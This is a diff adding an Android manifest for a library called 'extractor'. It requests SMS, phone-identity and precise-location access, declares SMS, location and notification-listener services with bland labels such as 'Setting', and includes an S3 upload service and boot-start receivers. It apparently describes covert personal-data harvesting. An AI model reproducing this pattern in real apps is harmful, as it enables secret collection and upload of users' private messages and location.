@@ -1,0 +1,64 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="info.kalagato.com.extractor" >
+    <!-- For sms access-->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"
+        tools:ignore="ProtectedPermissions" />
+
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <!-- For imei access-->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <!-- For location access-->
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-feature android:name="android.hardware.location.gps" />
+
+    <application>
+
+        <!--Service-->
+        <service
+            android:name="info.kalagato.com.extractor.TestJobService"
+            android:label="Word service"
+            android:permission="android.permission.BIND_JOB_SERVICE" >
+
+        </service>
+
+        <service android:name="info.kalagato.com.extractor.readers.ReadSMSService"/>
+        <service android:name="info.kalagato.com.extractor.readers.LocationReader"/>
+
+        <service android:name="info.kalagato.com.extractor.readers.NotificationListener"
+            android:label="Setting"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+        <service android:name="com.amazonaws.mobileconnectors.s3.transferutility.TransferService" android:enabled="true" />
+        <service android:name="info.kalagato.com.extractor.SyncService"/>
+        <!--Receiver-->
+        <receiver
+            android:name="info.kalagato.com.extractor.BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="info.kalagato.com.extractor.NetworkChangeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:process=":remote"
+            android:name="info.kalagato.com.extractor.AlarmReceiver" />
+
+    </application>
+
+</manifest>
